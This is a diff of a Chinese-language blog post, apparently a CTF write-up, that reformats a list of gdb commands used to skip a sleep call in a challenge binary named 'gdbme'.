-    -   啟用組合語言（Assembly, ASM）視圖
--   `break *(main+99)`
-    -   在 main 函數開始偏移 99 的位元組的地方設置斷點（Breakpoint）。
--   `jump *(main+104)`
-    -   跳到 main 函數開始偏移 104 位元組的地方繼續執行。
+- `chmod +x gdbme`
+  - 修改 gdbme 檔案的權限，新增執行權限（x）
+- `gdb gdbme`
+  - 使用 gdb（GNU Debugger）打開 gdbme 這個可執行檔案。
+- `layout asm`
+  - 啟用組合語言（Assembly, ASM）視圖
+- `break *(main+99)`
+  - 在 main 函數開始偏移 99 的位元組的地方設置斷點（Breakpoint）。
+- `jump *(main+104)`
+  - 跳到 main 函數開始偏移 104 位元組的地方繼續執行。
 
-至於這邊為甚麼要在 main+99 的地方設定斷點，是因為這裡他調用了一個函式叫做`sleep`，所以當我們直接執行 gdbme 的時候會進入到**sleep**的狀態，讓我們以為這個程式沒有做任何事。
+至於這邊為甚麼要在 main+99 的地方設定斷點，是因為這裡他調用了一個函式叫做 `sleep`，所以當我們直接執行 gdbme 的時候會進入到**sleep**的狀態，讓我們以為這個程式沒有做任何事。
 
 ![Sleep function](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/H1IxfrlvA.png)
 
